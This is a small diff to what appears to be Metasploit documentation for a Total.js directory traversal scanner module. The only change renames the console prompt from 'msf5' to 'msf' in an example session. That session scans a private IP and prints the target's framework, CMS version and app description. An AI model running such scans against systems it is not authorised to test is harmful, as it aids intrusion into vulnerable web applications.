@@ -47,12 +47,12 @@ Affecting total.js package, versions:
 ### Tested on Total.js framework 3.2.0 and Total.js CMS 12.0.0
 
 ```
-msf5 > use auxiliary/scanner/http/totaljs_traversal 
-msf5 auxiliary(scanner/http/totaljs_traversal) > set RHOST 192.168.2.59
+msf > use auxiliary/scanner/http/totaljs_traversal 
+msf auxiliary(scanner/http/totaljs_traversal) > set RHOST 192.168.2.59
 RHOST => 192.168.2.59
-msf5 auxiliary(scanner/http/totaljs_traversal) > set RPORT 8320
+msf auxiliary(scanner/http/totaljs_traversal) > set RPORT 8320
 RPORT => 8320
-msf5 auxiliary(scanner/http/totaljs_traversal) > run
+msf auxiliary(scanner/http/totaljs_traversal) > run
 [*] Running module against 192.168.2.59
 
 [*] Total.js version is: ^3.2.0
@@ -60,5 +60,5 @@ msf5 auxiliary(scanner/http/totaljs_traversal) > run
 [*] App description: A simple and powerful CMS solution written in Total.js / Node.js.
 [*] App version: 12.0.0
 [*] Auxiliary module execution completed
-msf5 auxiliary(scanner/http/totaljs_traversal) >
+msf auxiliary(scanner/http/totaljs_traversal) >
 ```
